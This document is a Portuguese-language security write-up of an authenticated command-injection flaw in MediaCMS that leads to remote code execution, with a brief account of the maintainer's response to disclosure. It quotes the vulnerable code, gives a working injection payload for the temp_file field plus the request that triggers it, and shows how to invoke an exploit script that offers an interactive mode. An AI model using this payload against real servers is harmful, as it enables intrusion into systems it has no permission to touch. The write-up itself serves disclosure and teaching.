Hello everyone,

Em maio de 2026, encontrei uma vulnerabilidade de Remote Code Execution (RCE) em um CMS com mais de 4.9k estrelas no GitHub, afetando versões iguais ou inferiores à 8.0.7.

O que deixa esse caso interessante é o que aconteceu no processo de divulgação: quando notifiquei o mantenedor, ele respondeu que não perderia tempo analisando o problema mesmo apresentando para ele uma POC 100% funcional e evidências claras da vulnerabilidade em tempo real. Mesmo assim, dois dias depois, uma atualização foi publicada corrigindo exatamente a falha, algo que em condições normais, teria gerado um CVE.

Neste artigo, apresento uma análise técnica da vulnerabilidade, abordando seu funcionamento e o processo de exploração.


About MediaCMS

O MediaCMS é um sistema de gerenciamento de conteúdo de vídeo e mídia moderno e completo, de código aberto. Foi desenvolvido para atender às necessidades das plataformas web atuais no que diz respeito à exibição e compartilhamento de mídias. É possível utilizar o MediaCMS para criar, em poucos minutos, um portal de vídeo e mídia, seja de pequeno ou médio porte.

Foi desenvolvido utilizando principalmente as tecnologias modernas Django + React. Além disso, conta com uma API REST.


Exploration Vector

O MediaCMS possui uma vulnerabilidade de injeção de comando do sistema operacional na função kill_ffmpeg_process ( files/methods.py ).

Essa função constrói um comando de shell, interpolando diretamente o caminho do arquivo, utilizando o operador de formatação de strings do Python %. Em seguida, a string resultante é passada para a função subprocess.run(..., shell=True) , sem qualquer tipo de verificação ou tratamento adequado.

Um invasor com credenciais de administrador pode inserir uma string arbitrária no campo temp_file de um objeto Encoding, por meio do endpoint da API EncodingDetail. Esse valor é, posteriormente, transmitido intacto como argumento filepath para a função kill_ffmpeg_process.

Essa função executa o comando inserido dentro de um shell. Os metacaracteres do shell, como o ponto e vírgula ( ; ), permitem a inserção de comandos do sistema operacional, que são executados no contexto do usuário do processo Celery ( www-data ).


Root Cause

A função kill_ffmpeg_process foi desenvolvida para localizar e eliminar processos ffmpeg ativos, através da busca realizada por meio de ps aux e grep . O caminho do arquivo especificado em grep é controlado pelo usuário (armazenado por meio da API de administração). Esse caminho é inserido diretamente na string de comando do shell. O uso de subprocess.run(..., shell=True) com uma string de entrada não validada é a causa principal do problema.


Affected Code

Sink — files/methods.py (~line 447)

def kill_ffmpeg_process(filepath):
    cmd = "ps aux|grep 'ffmpeg'|grep %s|grep -v grep |awk '{print $2}'" % filepath
    result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
    pid = result.stdout.decode("utf-8").strip()
    if pid:
        cmd = "kill -9 %s" % pid
        result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)

O parâmetro filepath, controlado pelo usuário, é interpolado diretamente em uma string de comando shell sem qualquer sanitização, e executado via subprocess.run() com shell=True o que permite que um atacante injete comandos arbitrários no sistema.


Source — files/views/encoding.py (~line 138)

if temp_file:
        encoding.temp_file = temp_file  # user-controlled, no sanitization
        to_update.append("temp_file")

O parâmetro temp_file, controlado pelo usuário, é atribuído diretamente ao objeto encoding.temp_file sem qualquer validação ou sanitização, permitindo que um atacante manipule o caminho do arquivo temporário utilizado no processo de encoding.


Trigger — files/tasks.py (~line 88, called from video_trim_task)

def handle_pending_running_encodings(media):
    encodings = media.encodings.exclude(status="success")
    for encoding in encodings:
        if encoding.temp_file:
            kill_ffmpeg_process(encoding.temp_file)  # << a injeção ocorre aqui

A função handle_pending_running_encodings itera sobre os encodings de uma mídia e, para cada um que possua temp_file definido, chama diretamente kill_ffmpeg_process com o valor armazenado que, como visto anteriormente, é controlado pelo usuário e não sanitizado. É aqui que a injeção de comandos é efetivamente disparada.


Proof of concept

Para demonstrar a vulnerabilidade foi construido um payload onde executa o comando id e redireciona para um arquivo:

action=update_fields&status=pending&temp_file=/tmp/a;$(id>/home/mediacms.io/mediacms/media_files/original/thumbnails/user/admin/poc.jpg);echo

O payload aproveita o parâmetro temp_file para injetar um comando via substituição de processo $(). O ; encerra o caminho legítimo, id é executado e sua saída é redirecionada para um arquivo .jpg, o echo no final evita erros de sintaxe no shell.

Response:

{"status": "success"}

O payload é armazenado em encoding.temp_file no banco de dados.

Notes on output path selection:

nginx serve arquivos localizados em media_files/original/thumbnails/ sem restrições quanto às extensões dos arquivos.

Os arquivos do tipo Dotfiles (por exemplo, .rce.txt) são bloqueados pelo nginx (location ~ /\. { deny all; }).

Os subdiretórios criados dinamicamente retornam o código 404, pois o diretório não existe no container do Celery no momento da execução.

thumbnails/user/username/ já existe e pode ser modificado por www-data.

Trigger Execution via trim_video

A tarefa video_trim_task do Celery chama a função handle_pending_running_encodings , que itera por todas as codificações que não foram bem-sucedidas e passa o resultado para kill_ffmpeg_process.

Payload: 

{"segments": [{"startTime": "00:00:00.000", "endTime": "00:01:00.000"}]}

Ao usar startTime=00:00:00.000 , get_trim_timestamps é executado imediatamente, sem que ffprobe seja executado. Dessa forma, a tarefa é realizada, independentemente do tipo de mídia utilizada.

Response:

{"success": true, "request_id":75}

Confirm RCE

Aguarde cerca de 4 segundos para que o Celery processe a tarefa. Em seguida, visite o arquivo criado na web.

GET /media/original/thumbnails/user/admin/poc.jpg HTTP/1.1

Dessa forma, um usuário administrador consegue obter execução remota de código no servidor.


Exploit

Com base na análise da vulnerabilidade, foi desenvolvida uma prova de conceito automatizada em Python, que abrange todo o fluxo de exploração manual, desde a autenticação até a injeção do payload. O exploit contém duas funcionalidades importantes sendo elas --command e a --interactive.

O exploit estará disponível no meu github neste link.


python3 exploit.py -u admin -p Senha@123 --command "id"
 


python3 exploit.py -u admin -p Senha@123 --interactive
